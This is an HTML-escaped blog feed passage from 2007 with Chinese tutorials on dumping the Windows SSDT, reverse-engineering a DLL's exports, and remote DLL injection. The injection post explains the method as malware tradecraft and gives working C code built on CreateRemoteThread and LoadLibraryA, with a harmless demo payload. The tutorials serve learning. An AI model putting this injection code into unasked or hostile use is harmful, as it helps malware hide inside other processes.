);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCVOID pFunc&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; = (LPCVOID)( (DWORD)hNtDll + pFuncArray[pOrdNameArray[i]] );&lt;br&gt;// 解析函数，获取服务名&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; SSDTENTRY entry;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; CopyMemory( &amp;amp;entry, pFunc, sizeof( SSDTENTRY ) );&lt;br&gt;if ( MOV == entry.byMov )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ULONG ulAddr = 0;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GetProc( hDriver, entry.dwIndex, &amp;amp;ulAddr );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; CHAR strModule[MAX_PATH] = "[Unknown Module]";&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; FindModuleByAddr( ulAddr, pList, strModule, MAX_PATH );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; printf( "0x%04X\t%s\t0x%08X\t%s\r\n", entry.dwIndex,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; strModule, ulAddr, pszName );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DestroyModuleList( pList );&lt;br&gt;}&lt;/code&gt; &lt;p&gt;下图是示例程序SSDTDump在XP sp2上的部分运行截图，显示了SSDT的基地址、服务个数，以及各个表项所对应的服务号、所在模块、地址和服务名。 &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/ssdtdump3.gif"&gt; &lt;p&gt;&lt;b&gt;结语&lt;/b&gt; &lt;p&gt;ring3与ring0，城里与城外之间为一道叹息之墙所间隔，SSDT则是越过此墙的一道必经之门。因此，很多杀毒软件也势必会围绕着它大做文章。无论是System Safety Monitor的系统监控，还是卡巴斯基的主动防御，都是挂钩了SSDT。这样，病毒尚在ring3内发作之时，便被扼杀于摇篮之内。 &lt;p&gt;内核最高权限，本就是兵家必争之地，魔高一尺道高一丈的争夺于此亦已变成颇为稀松平常之事。可以说和这些争夺比起来，SSDT的相关技术简直不值一提。但最初发作的病毒体总是从ring3开始的——换句话说，任你未来会成长为何等的武林高手，我都可以在你学走路的时候杀掉你——知晓了SSDT的这点优势，所有的病毒咂吧咂吧也就都没味儿了。所以说么，杀毒莫如防毒。 &lt;p&gt;——就此打住罢，貌似扯远大发了。</description></item><item><title>调用未知DLL中的导出函数</title><link>https://blogs.qipai360.cn/post/call-exported-functions-unknown-dll/</link><pubDate>Wed, 07 Nov 2007 10:49:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/call-exported-functions-unknown-dll/</guid><description>&lt;p&gt;不知道诸位看官是否有过这样的经历：在不经意之间发现一个DLL文件，它里边有不少有趣的导出函数——但是由于你不知道如何调用这些函数，所以只能大发感慨而又无能为力焉。固然有些知名的DLL可以直接通过搜索引擎来找到它的使用方式（比如本文中的例子ipsearcher.dll），不过我们诚然不能希望自己总能交到这样的好运。所以在本文中，李马希望通过自己文理不甚通达的讲解能够给大家以授人以渔的效果。 &lt;p&gt;&lt;b&gt;先决条件&lt;/b&gt; &lt;p&gt;阅读本文，你需要具备以下先决条件： &lt;ul&gt; &lt;li&gt;初步了解汇编语言，虽然你并不一定需要去读懂DLL中导出函数的汇编代码，但是你至少应该了解诸如push、mov这些常用的汇编指令。 &lt;li&gt;一个能够查看DLL中导出函数的工具，Visual Studio中自带的Dependency Walker就足够胜任了，当然你也可以选择eXeScope。 &lt;li&gt;一个调试器。理论上讲VC也可以完成调试的工作，但它毕竟是更加针对于源代码一级调试的工具，所以你最好选择一个专用的汇编调试器。在本文中我用的是OllyDbg——我不会介绍有关这个调试工具的任何东西，而只是简要介绍我的调试过程。 &lt;/li&gt;&lt;/ul&gt; &lt;p&gt;准备好了吗？那么我们做一个热身运动吧先。 &lt;p&gt;&lt;b&gt;热身——函数调用约定&lt;/b&gt; &lt;p&gt;这里要详细介绍的是有关函数调用约定的内容，如果你已经了解了这方面的内容，可以跳过本节。 &lt;p&gt;你可能在学习Windows程序设计的时候早已接触过“函数调用约定”这个词汇了，那个时候你所了解的内容可能是一个笼统的概念，内容大抵是说函数调用约定就是指的函数参数进栈顺序以及堆栈修正方式。譬如cdecl调用约定是函数参数自右而左进栈，由调用者修复堆栈；stdcall调用约定亦是函数参数自右而左进栈，但是由被调用者修复堆栈……噢不，这太晦涩了——在源代码上我们是无法看到这些东西的！ &lt;p&gt;那么我们别无选择，只有深入到汇编一层了。考虑以下C++代码： &lt;p&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;int __cdecl max1( int a, int b )&lt;br&gt;{&lt;br&gt;return a &amp;gt; b ? a : b;&lt;br&gt;}&lt;br&gt;int __stdcall max2( int a, int b )&lt;br&gt;{&lt;br&gt;return a &amp;gt; b ? a : b;&lt;br&gt;}&lt;br&gt;int main()&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; printf( "max( 1, 2 ) of cdecl version: %d\n", max1( 1, 2 ) );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; printf( "max( 1, 2 ) of stdcall version: %d\n", max2( 1, 2 ) );&lt;br&gt;return 0;&lt;br&gt;}&lt;/code&gt; &lt;p&gt;对应的汇编代码为： &lt;p&gt;&lt;code&gt;; int __cdecl max1( int a, int b )&lt;br&gt;00401000 MOV EAX,DWORD PTR SS:[ESP+4]&lt;br&gt;00401004 MOV ECX,DWORD PTR SS:[ESP+8]&lt;br&gt;00401008 CMP EAX,ECX&lt;br&gt;0040100A JG SHORT CppTest.0040100E&lt;br&gt;0040100C MOV EAX,ECX&lt;br&gt;0040100E RETN&lt;br&gt;; int __stdcall max2( int a, int b )&lt;br&gt;00401010 MOV EAX,DWORD PTR SS:[ESP+4]&lt;br&gt;00401014 MOV ECX,DWORD PTR SS:[ESP+8]&lt;br&gt;00401018 CMP EAX,ECX&lt;br&gt;0040101A JG SHORT CppTest.0040101E&lt;br&gt;0040101C MOV EAX,ECX&lt;br&gt;0040101E RETN 8 ; 被调用者的堆栈修正&lt;br&gt;; max1( 1, 2 )&lt;br&gt;00401030 PUSH 2&lt;br&gt;00401032 PUSH 1&lt;br&gt;00401034 CALL CppTest.00401000&lt;br&gt;00401039 ADD ESP,8 ; 调用者的堆栈修正&lt;br&gt;; max2( 1, 2 )&lt;br&gt;0040104A PUSH 2&lt;br&gt;0040104C PUSH 1&lt;br&gt;0040104E CALL CppTest.00401010&lt;/code&gt; &lt;p&gt;好了，我来简要介绍一下。函数参数传入函数体是借由堆栈段完成的，也就是将各个参数依某种次序推入SS中——在cdecl与stdcall约定中，这个次序都是自右而左的。另外，由于将参数推入了堆栈致使堆栈指针ESP发生了变化，所以要在函数结束的时候重新修正ESP。从上边的汇编代码中你也可以很清楚地看到，cdecl约定是在调用max1之后修正的ESP，而stdcall约定则是在max2返回时借由RETN 8完成了这个修正工作。 &lt;p&gt;另外，从上边的汇编代码中还可以看到，函数的返回值是由EAX带回的。 &lt;p&gt;&lt;b&gt;庖丁解牛&lt;/b&gt; &lt;p&gt;在了解了以上的知识后，我们就可以使用调试器来调试那个未知的DLL了。可以说，这整个的调试过程充满了惊险和刺激，而且我们还需要一定的技巧——如果你像我一样不喜欢阅读汇编代码的话。 &lt;p&gt;在本文中，我所选择的调试示例是FTerm中附带的ipsearcher.dll，它提供了对纯真IP数据库的查询接口。下图是用Dependency Walker对其分析的结果： &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/dllexport1.gif"&gt; &lt;p&gt;你可以看到，这里边有两个导出函数：LookupAddress和_GetAddress，那么我们可以按照返回值、调用约定、函数名、参数列表的顺序将它们声明如下： &lt;p&gt;&lt;code&gt;? ? LookupAddress( ? );&lt;br&gt;? ? _GetAddress( ? );&lt;/code&gt; &lt;p&gt;是的，有太多的未知，下面李马将要逐一地破解这些问号。 &lt;p&gt;调试器不可能孤立地对DLL进行调试，我们所需要的应该是一个合适的EXE，这样有助于我们的探究工作。在这里我选择的EXE是我编写的ipsearcher.exe，当然这可能会让你认为我这篇文章的组织顺序有问题——毕竟是我已经知道了这两个导出函数之后（编写了ipsearcher.exe）还要假装成不知道的样子来对ipsearcher.dll来进行探究，所以我决定在下文中不对ipsearcher.exe的代码进行任何关注，而是直接进入到ipsearcher.dll的领空。 &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/dllexport2.gif"&gt; &lt;p&gt;打开调试器，载入ipsearcher.exe。当ipsearcher.dll被装载后，会引发一个访问异常，可以忽略这个异常继续调试。根据Dependency Walker的分析结果，在ipsearcher.dll的0x00001BB0和0x00001C40处各下一个断点。现在在“IP地址”中输入一个IP地址（这里以&lt;a href="http://bbs.nuc.edu.cn/"&gt;寒泉BBS&lt;/a&gt;的IP为例），点击“查询”，会发现指令跳入0x00001C40中（也就是_GetAddress），它的代码如下： &lt;p&gt;&lt;code&gt;10001C40 MOV EAX,DWORD PTR SS:[ESP+4] ; 一个参数&lt;br&gt;10001C44 PUSH ipsear_1.10009BE8&lt;br&gt;10001C49 PUSH EAX&lt;br&gt;10001C4A CALL ipsear_1.LookupAddress ; 两个参数&lt;br&gt;10001C4F ADD ESP,8 ; LookupAddress是cdecl调用约定&lt;br&gt;10001C52 MOV EAX,ipsear_1.10009BE8&lt;br&gt;10001C57 RETN ; _GetAddress这厮也是cdecl调用约定&lt;/code&gt; &lt;p&gt;很短的几行代码，不过它已经可以提供这些信息了： &lt;ul&gt; &lt;li&gt;从SS的使用来看，_GetAddress只带有一个参数。 &lt;li&gt;_GetAddress中调用了LookupAddress，后者带有两个参数。 &lt;li&gt;调用LookupAddress之后进行了堆栈修正，所以LookupAddress是cdecl调用约定。 &lt;li&gt;_GetAddress返回时并未进行堆栈修正，所以_GetAddress也是cdecl调用约定。 &lt;/li&gt;&lt;/ul&gt; &lt;p&gt;于是，我们可以替换一下刚才的问号了： &lt;p&gt;&lt;code&gt;? CDECL LookupAddress( ?, ? );&lt;br&gt;? CDECL _GetAddress( ? );&lt;/code&gt; &lt;p&gt;下面可以进行单步调试了，当代码步至10001C44时，你会发现寄存器窗口发生了如下的变化： &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/dllexport3.gif"&gt; &lt;p&gt;“202.207.177.9”终于出现了，这样一来我们可以继续对问号进行替换了： &lt;p&gt;&lt;code&gt;? CDECL LookupAddress( PCSTR, ? );&lt;br&gt;? CDECL _GetAddress( PCSTR );&lt;/code&gt; &lt;p&gt;现在继续对代码进行跟踪，是进入LookupAddress的时候了。我们可以从先前_GetAddress的代码中可以发现，这两个导出函数一直在围绕10009BE8这个地址做文章，那么我们就要在单步调试LookupAddress的同时关注这个地址的数据改变。几步跟踪之后，你会发现10009BE8开头的8字节（两个DWORD）数据发生了改变，变成了10009AB4和10009B1C。那么我们再转向这两个地址，会发现： &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/dllexport4.gif"&gt; &lt;p&gt;这样一来就很清楚了，10009BE8是一个字符串指针的数组，它有两个元素。也就是说，我们的函数声明可以换成这样： &lt;p&gt;&lt;code&gt;? CDECL LookupAddress( PCSTR, PSTR* );&lt;br&gt;PSTR* CDECL _GetAddress( PCSTR );&lt;/code&gt; &lt;p&gt;接下来需要确定的就是LookupAddress的返回值了。纵观LookupAddress的返回代码，你会发现这样的片断： &lt;p&gt;&lt;code&gt;; 片断1&lt;br&gt;10001C0B XOR EAX,EAX&lt;br&gt;10001C0D POP ESI&lt;br&gt;10001C0E RETN&lt;br&gt;; 片断2&lt;br&gt;10001C2B MOV EAX,1&lt;br&gt;10001C30 POP ESI&lt;br&gt;10001C31 RETN&lt;/code&gt; &lt;p&gt;也就是说，这个函数有两个返回值：0或1。那么最后的真相终于大白于天下—— &lt;p&gt;&lt;code&gt;BOOL CDECL LookupAddress( PCSTR, PSTR* );&lt;br&gt;PSTR* CDECL _GetAddress( PCSTR );&lt;/code&gt; &lt;p&gt;&lt;b&gt;GetProcAddress？&lt;/b&gt; &lt;p&gt;到此为止，这两个函数的声明终于让我们找出来了。也许你会觉得这就够了——接下来就是用typedef定义函数指针，然后使用LoadLibrary、GetProcAddress调用这些函数的事情了。 &lt;p&gt;如果你真的这么认为的话，那我认为我有必要向你介绍这另外的一种方式。 &lt;p&gt;首先请你建立一个名为ipsearcher.def的文件，然后在其中写入如下内容： &lt;p&gt;&lt;code&gt;LIBRARY "ipsearcher"&lt;br&gt;EXPORTS&lt;br&gt;LookupAddress @1&lt;br&gt;_GetAddress&amp;nbsp;&amp;nbsp; @2&lt;/code&gt; &lt;p&gt;将文件保存后，进入到命令行模式下，输入以下命令（前提是你拥有Visual Studio的附带工具lib.exe并有正确的路径指向。以Visual Studio 6.0为例，这个工具通常位于Microsoft Visual Studio\VC98\Bin下）： &lt;p&gt;lib /def:ipsearcher.def &lt;p&gt;执行的结果有一个警告，不必理会。这时候我们会发现，lib为我们生成了一个ipsearcher.lib。 &lt;p&gt;然后，我们继续编写ipsearcher.h文件，如下： &lt;p&gt;&lt;code&gt;#ifndef IPSEARCHER_H&lt;br&gt;#define IPSEARCHER_H&lt;br&gt;#include &amp;lt;windows.h&amp;gt;&lt;br&gt;#pragma comment( lib, "ipsearcher.lib" )&lt;br&gt;extern "C"&lt;br&gt;{&lt;br&gt;BOOL CDECL LookupAddress( PCSTR, PSTR* );&lt;br&gt;PSTR* CDECL _GetAddress( PCSTR );&lt;br&gt;};&lt;br&gt;#endif // IPSEARCHER_H&lt;/code&gt; &lt;p&gt;大功告成！这样我们就为这个光秃秃的ipsearcher.dll做了一份SDK开发包，而不必再使用动态加载的方法了。 &lt;p&gt;&lt;b&gt;总结一下再&lt;/b&gt; &lt;p&gt;其实，探究一个DLL并非像我这里所讲述的这么简单。这项工作很可能需要阅读大量的汇编代码，了解DLL函数体的流程才能使真相大白于天下。另外，还不能排除有的DLL被加密、加壳、反跟踪……也就是说对于ipsearcher.dll，那简直就是我捡了个便宜来借花献佛了。 &lt;p&gt;&lt;a href="http://www.titilima.cn/download/ipsearcher.zip"&gt;点这里下载ipsearcher SDK&lt;/a&gt;&lt;/p&gt;</description></item><item><title>DLL的远程注入技术</title><link>https://blogs.qipai360.cn/post/dll-remote-injection-technique/</link><pubDate>Wed, 07 Nov 2007 10:47:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/dll-remote-injection-technique/</guid><description>&lt;p&gt;&lt;/p&gt; &lt;p&gt;DLL的远程注入技术是目前Win32病毒广泛使用的一种技术。使用这种技术的病毒体通常位于一个DLL中，在系统启动的时候，一个EXE程序会将这个DLL加载至某些系统进程（如Explorer.exe）中运行。这样一来，普通的进程管理器就很难发现这种病毒了，而且即使发现了也很难清除，因为只要病毒寄生的进程不终止运行，那么这个DLL就不会在内存中卸载，用户也就无法在资源管理器中删除这个DLL文件，真可谓一箭双雕哉。 &lt;p&gt;记得2003年QQ尾巴病毒肆虐的时候，就已经有些尾巴病毒的变种在使用这种技术了。到了2004年初，我曾经尝试着仿真了一个QQ尾巴病毒，但独是跳过了DLL的远程加载技术。直到最近在学校论坛上看到了几位朋友在探讨这一技术，便忍不住将这一尘封已久的技术从我的记忆中拣了出来，以满足广大的技术爱好者们。 &lt;p&gt;&lt;b&gt;必备知识&lt;/b&gt; &lt;p&gt;在阅读本文之前，你需要了解以下几个API函数： &lt;p&gt;OpenProcess - 用于打开要寄生的目标进程。&lt;br&gt;VirtualAllocEx/VirtualFreeEx - 用于在目标进程中分配/释放内存空间。&lt;br&gt;WriteProcessMemory - 用于在目标进程中写入要加载的DLL名称。&lt;br&gt;CreateRemoteThread - 远程加载DLL的核心内容，用于控制目标进程调用API函数。&lt;br&gt;LoadLibrary - 目标进程通过调用此函数来加载病毒DLL。 &lt;p&gt;在此我只给出了简要的函数说明，关于函数的详细功能和介绍请参阅MSDN。 &lt;p&gt;&lt;b&gt;示例程序&lt;/b&gt; &lt;p&gt;我将在以下的篇幅中用一个简单的示例Virus.exe来实现这一技术。这个示例的界面如下图： &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/remote1.gif"&gt; &lt;p&gt;首先运行Target.exe，这个文件是一个用Win32 Application向导生成的“Hello, World”程序，用来作为寄生的目标进程。 &lt;p&gt;然后在界面的编辑控件中输入进程的名称“Target.exe”，单击“注入DLL”按钮，这时候Virus.exe就会将当前目录下的DLL.dll注入至Target.exe进程中。 &lt;p&gt;在注入DLL.dll之后，你也可以单击“卸载DLL”来将已经注入的DLL卸载。 &lt;p&gt;&lt;a href="http://www.titilima.cn/sample/remotedll.zip"&gt;点这里下载示例程序&lt;/a&gt; &lt;p&gt;&lt;b&gt;模拟的病毒体DLL.dll&lt;/b&gt; &lt;p&gt;这是一个简单的Win32 DLL程序，它仅由一个入口函数DllMain组成： &lt;p&gt;&lt;code&gt;BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )&lt;br&gt;{&lt;br&gt;switch ( fdwReason )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;case DLL_PROCESS_ATTACH:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MessageBox( NULL, _T("DLL已进入目标进程。"), _T("信息"), MB_ICONINFORMATION );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;break;&lt;br&gt;case DLL_PROCESS_DETACH:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; MessageBox( NULL, _T("DLL已从目标进程卸载。"), _T("信息"), MB_ICONINFORMATION );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;break;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;return TRUE;&lt;br&gt;}&lt;/code&gt; &lt;p&gt;如你所见，这里我在DLL被加载和卸载的时候调用了MessageBox，这是用来显示我的远程注入/卸载工作是否成功完成。而对于一个真正的病毒体来说，它往往就是处理DLL_PROCESS_ATTACH事件，在其中加入了启动病毒代码的部分： &lt;p&gt;&lt;code&gt;case DLL_PROCESS_ATTACH:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; StartVirus();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;break;&lt;/code&gt; &lt;p&gt;&lt;b&gt;注入！&lt;/b&gt; &lt;p&gt;现在要开始我们的注入工作了。首先，我们需要找到目标进程： &lt;p&gt;&lt;code&gt;DWORD FindTarget( LPCTSTR lpszProcess )&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwRet = 0;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; PROCESSENTRY32 pe32;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; pe32.dwSize = sizeof( PROCESSENTRY32 );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Process32First( hSnapshot, &amp;amp;pe32 );&lt;br&gt;do&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;if ( lstrcmpi( pe32.szExeFile, lpszProcess ) == 0 )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dwRet = pe32.th32ProcessID;&lt;br&gt;break;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; } while ( Process32Next( hSnapshot, &amp;amp;pe32 ) );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle( hSnapshot );&lt;br&gt;return dwRet;&lt;br&gt;}&lt;/code&gt; &lt;p&gt;这里我使用了Tool Help函数库，当然如果你是NT系统的话，也可以选择PSAPI函数库。这段代码的目的就是通过给定的进程名称来在当前系统中查找相应的进程，并返回该进程的ID。得到进程ID后，就可以调用OpenProcess来打开目标进程了： &lt;p&gt;&lt;code&gt;// 打开目标进程&lt;br&gt;HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessID );&lt;/code&gt; &lt;p&gt;现在有必要说一下OpenProcess第一个参数所指定的三种权限。在Win32系统下，每个进程都拥有自己的4G虚拟地址空间，各个进程之间都相互独立。如果一个进程需要完成跨进程的工作的话，那么它必须拥有目标进程的相应操作权限。在这里，PROCESS_CREATE_THREAD表示我可以通过返回的进程句柄在该进程中创建新的线程，也就是调用CreateRemoteThread的权限；同理，PROCESS_VM_OPERATION则表示在该进程中分配/释放内存的权限，也就是调用VirtualAllocEx/VirtualFreeEx的权限；PROCESS_VM_WRITE表示可以向该进程的地址空间写入数据，也就是调用WriteProcessMemory的权限。 &lt;p&gt;至此目标进程已经打开，那么我们该如何来将DLL注入其中呢？在这之前，我请你看一行代码，是如何在本进程内显式加载DLL的： &lt;p&gt;&lt;code&gt;HMODULE hDll = LoadLibrary( "DLL.dll" ); &lt;/code&gt; &lt;p&gt;那么，如果能控制目标进程调用LoadLibrary，不就可以完成DLL的远程注入了么？的确是这样，我们可以通过CreateRemoteThread将LoadLibrary作为目标进程的一个线程来启动，这样就可以完成“控制目标进程调用LoadLibrary”的工作了。到这里，也许你会想当然地写下类似这样的代码： &lt;p&gt;&lt;code&gt;DWORD dwID;&lt;br&gt;LPVOID pFunc = LoadLibraryA;&lt;br&gt;HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, (LPVOID)"DLL.dll", 0, &amp;amp;dwID );&lt;/code&gt; &lt;p&gt;不过结果肯定会让你大失所望——注入DLL失败！ &lt;p&gt;嗯嗯，那么现在让我们来分析一下失败的原因吧。我是前说过，在Win32系统下，每个进程都拥有自己的4G虚拟地址空间，各个进程之间都是相互独立的。在这里，我们当作参数传入的字符串"DLL.dll"其实是一个数值，它表示这个字符串位于Virus.exe地址空间之中的地址，而这个地址在传给Target.exe之后，它指向的东西就失去了有效性。举个例子来说，譬如A、B两栋大楼，我住在A楼的401；那么B楼的401住的是谁我当然不能确定——也就是401这个门牌号在B楼失去了有效性，而且如果我想要入住B楼的话，我就必须请B楼的楼长为我在B楼中安排新的住处（当然这个新的住处是否401也就不一定了）。 &lt;p&gt;由此看来，我就需要做这么一系列略显繁杂的手续——首先在Target.exe目标进程中分配一段内存空间，然后向这段空间写入我要加载的DLL名称，最后再调用CreateRemoteThread。这段代码就成了这样： &lt;p&gt;&lt;code&gt;// 向目标进程地址空间写入DLL名称&lt;br&gt;DWORD dwSize, dwWritten;&lt;br&gt;dwSize = lstrlenA( lpszDll ) + 1;&lt;br&gt;LPVOID lpBuf = VirtualAllocEx( hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE );&lt;br&gt;if ( NULL == lpBuf )&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle( hProcess );&lt;br&gt;// 失败处理&lt;br&gt;}&lt;br&gt;if ( WriteProcessMemory( hProcess, lpBuf, (LPVOID)lpszDll, dwSize, &amp;amp;dwWritten ) )&lt;br&gt;{&lt;br&gt;// 要写入字节数与实际写入字节数不相等，仍属失败&lt;br&gt;if ( dwWritten != dwSize )&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; VirtualFreeEx( hProcess, lpBuf, dwSize, MEM_DECOMMIT );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle( hProcess );&lt;br&gt;// 失败处理&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; CloseHandle( hProcess );&lt;br&gt;// 失败处理&lt;br&gt;}&lt;br&gt;// 使目标进程调用LoadLibrary，加载DLL&lt;br&gt;DWORD dwID;&lt;br&gt;LPVOID pFunc = LoadLibraryA;&lt;br&gt;HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, lpBuf, 0, &amp;amp;dwID );&lt;/code&gt; &lt;p&gt;需要说的有两点，一是由于我要在目标进程中为ANSI字符串来分配内存空间，所以这里凡是和目标进程相关的部分，都明确使用了后缀为“A”的API函数——当然，如果要使用Unicode字符串的话，可以换作后缀是“W”的API；第二，在这里LoadLibrary的指针我是取的本进程的LoadLibraryA的地址，这是因为LoadLibraryA/LoadLibraryW位于kernel32.dll之中，而Win32下每个应用程序都会把kernel32.dll加载到进程地址空间中一个固定的地址，所以这里的函数地址在Target.exe中也是有效的。 &lt;p&gt;在调用LoadLibrary完毕之后，我们就可以做收尾工作了： &lt;p&gt;&lt;code&gt;// 等待LoadLibrary加载完毕&lt;br&gt;WaitForSingleObject( hThread, INFINITE );&lt;br&gt;// 释放目标进程中申请的空间&lt;br&gt;VirtualFreeEx( hProcess, lpBuf, dwSize, MEM_DECOMMIT );&lt;br&gt;CloseHandle( hThread );&lt;br&gt;CloseHandle( hProcess );&lt;/code&gt; &lt;p&gt;在此解释一下WaitForSingleObject一句。由于我们是通过CreateRemoteThread在目标进程中另外开辟了一个LoadLibrary的线程，所以我们必须等待这个线程运行完毕才能够释放那段先前申请的内存。 &lt;p&gt;好了，现在你可以尝试着整理这些代码并编译运行。运行Target.exe，然后开启一个有模块查看功能的进程查看工具（在这里我使用我的July）来查看Target.exe的模块，你会发现在注入DLL之前，Target.exe中并没有DLL.dll的存在： &lt;p&gt;&lt;img 